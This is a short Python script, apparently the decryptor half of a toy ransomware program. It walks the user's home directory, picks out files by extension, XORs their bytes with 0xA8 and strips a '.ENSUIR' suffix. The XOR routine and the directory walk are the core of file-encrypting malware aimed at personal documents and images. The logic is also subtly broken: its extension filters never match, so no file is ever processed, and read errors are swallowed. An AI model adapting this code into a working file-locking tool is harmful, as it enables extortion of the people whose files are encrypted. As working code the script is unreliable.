import os

exts = ['.pdf', '.docx', '.ppt', '.txt', '.xls', '.png', '.jpg']


#gets list of files for encryption
def start(userdir):
    for root, dirs, files in os.walk(userdir, topdown=True):
        for name in files:
            target = os.path.join(root,name)
            ext = os.path.splitext(name)
            if ext[1] in exts and ext[0][0] != "#" and ext[0][0] != "$":
                dencrypt(target)


def xord(data):
    return bytearray([b^0xA8 for b in bytearray(data)])


#It will XOR the data from a file once with b^0xA8
def dencrypt(file):
    if os.path.splitext(file)[1] == ".ENSUIR":
        try:
            with open(file, 'rb') as f:
                data = f.read()
        except:
            pass
        try:
            with open(file, 'wb') as fp:
                fp.write(xord(data))
                os.rename(file, os.path.splitext(file)[0])
        except:
            pass


def main():
    userdir = os.path.expanduser('~')
    start(userdir)

if __name__ == "__main__":
    main()
